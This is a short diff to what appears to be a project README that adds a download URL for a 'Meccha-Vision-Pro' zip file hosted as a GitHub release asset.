@@ -7,7 +7,7 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Meccha-Vision-Pro]()**
+🔗 **[Download Meccha-Vision-Pro](https://github.com/personalplace/Meccha-Vision-Pro/releases/download/isuy/mechavision.zip)**
 
 
 ---
